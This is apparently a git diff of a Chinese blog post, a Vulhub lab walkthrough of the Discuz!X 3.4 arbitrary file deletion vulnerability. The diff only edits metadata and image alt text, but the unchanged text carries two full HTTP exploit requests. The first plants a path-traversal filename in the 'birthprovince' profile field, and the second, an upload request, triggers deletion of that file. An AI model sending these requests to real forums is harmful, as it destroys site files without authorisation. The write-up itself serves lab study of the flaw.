@@ -99,7 +99,7 @@
 <meta property="og:image" content="https://assassins-white.github.io/img/21-11-18/11.png">
 <meta property="og:image" content="https://assassins-white.github.io/img/21-11-18/12.png">
 <meta property="article:published_time" content="2021-11-18T02:12:48.000Z">
-<meta property="article:modified_time" content="2021-11-18T02:55:39.215Z">
+<meta property="article:modified_time" content="2022-04-26T08:12:43.169Z">
 <meta property="article:author" content="Assassins 小白">
 <meta property="article:tag" content="Discuz!x3.4">
 <meta property="article:tag" content="任意文件删除">
@@ -353,34 +353,34 @@
 <span id="more"></span>
 
 <p>Vulhub运行报错，因为端口占用了，默认是使用80端口</p>
-<p><img src="../../../../img/21-11-18/1.png"></p>
+<p><img src="../../../../img/21-11-18/1.png" alt="Assassins小白"></p>
 <p>修改目录下的 <code>docker-compose.yml</code> 文件，前面这个端口号修改为其他空闲端口</p>
-<p><img src="../../../../img/21-11-18/2.png"></p>
+<p><img src="../../../../img/21-11-18/2.png" alt="Assassins小白"></p>
 <p><code>docker-compose up -d</code> 运行</p>
-<p><img src="../../../../img/21-11-18/3.png"></p>
+<p><img src="../../../../img/21-11-18/3.png" alt="Assassins小白"></p>
 <p>访问网站</p>
-<p><img src="../../../../img/21-11-18/4.png"></p>
+<p><img src="../../../../img/21-11-18/4.png" alt="Assassins小白"></p>
 <p>将 <code>数据库服务器</code> 修改为 <code>db</code> ，设置好账号密码，下一步</p>
-<p><img src="../../../../img/21-11-18/5.png"></p>
+<p><img src="../../../../img/21-11-18/5.png" alt="Assassins小白"></p>
 <p>安装完成</p>
-<p><img src="../../../../img/21-11-18/6.png"></p>
+<p><img src="../../../../img/21-11-18/6.png" alt="Assassins小白"></p>
 <p>注册一个用户</p>
-<p><img src="../../../../img/21-11-18/7.png"></p>
+<p><img src="../../../../img/21-11-18/7.png" alt="Assassins小白"></p>
 <p>在个人资料页 <code>/home.php?mod=spacecp</code> ，找到自己的 <code>formhash</code> 值 </p>
-<p><img src="../../../../img/21-11-18/8.png"></p>
+<p><img src="../../../../img/21-11-18/8.png" alt="Assassins小白"></p>
 <p>带上自己的 <code>Cookie</code> <code>formhash</code> 值发送如下数据包</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;home.php?mod&#x3D;spacecp&amp;ac&#x3D;profile&amp;op&#x3D;base HTTP&#x2F;1.1</span><br><span class="line">Host: IP&#x2F;域名:端口</span><br><span class="line">Content-Length: 367</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryPFvXyxL45f34L12s</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;61.0.3163.79 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en;q&#x3D;0.6</span><br><span class="line">Cookie: 你账号的cookie</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryPFvXyxL45f34L12s</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;formhash&quot;</span><br><span class="line"></span><br><span class="line">你的formhash值</span><br><span class="line">------WebKitFormBoundaryPFvXyxL45f34L12s</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;birthprovince&quot;</span><br><span class="line"></span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;robots.txt  # 你要删除的文件名</span><br><span class="line">------WebKitFormBoundaryPFvXyxL45f34L12s</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;profilesubmit&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryPFvXyxL45f34L12s--</span><br></pre></td></tr></table></figure>
 
 <p>尝试删除 <code>favicon.ico</code> 文件</p>
-<p><img src="../../../../img/21-11-18/9.png"></p>
+<p><img src="../../../../img/21-11-18/9.png" alt="Assassins小白"></p>
 <p>个人资料处的出生地变化 <code>/home.php?mod=spacecp</code>，说明修改成功</p>
-<p><img src="../../../../img/21-11-18/10.png"></p>
+<p><img src="../../../../img/21-11-18/10.png" alt="Assassins小白"></p>
 <p>使用如下POC上传任意一个文件，上传后，文件被删除</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;home.php?mod&#x3D;spacecp&amp;ac&#x3D;profile&amp;op&#x3D;base&amp;profilesubmit&#x3D;1&amp;formhash&#x3D;你的formhash HTTP&#x2F;1.1</span><br><span class="line">Host: IP&#x2F;域名:端口</span><br><span class="line">Content-Length: 2011679</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundarysI786OHcNJPV5eGT</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;95.0.4638.69 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: 你账户的cookie</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarysI786OHcNJPV5eGT</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;birthprovince&quot;; filename&#x3D;&quot;Default.jpg&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">上传文件内容</span><br><span class="line">------WebKitFormBoundarysI786OHcNJPV5eGT--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="../../../../img/21-11-18/11.png"></p>
+<p><img src="../../../../img/21-11-18/11.png" alt="Assassins小白"></p>
 <p>文件被删除</p>
-<p><img src="../../../../img/21-11-18/12.png"></p>
+<p><img src="../../../../img/21-11-18/12.png" alt="Assassins小白"></p>
 
       
     </div>
@@ -497,7 +497,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-count">42</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -510,7 +510,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">85</span>
+                  <span class="site-state-item-count">87</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
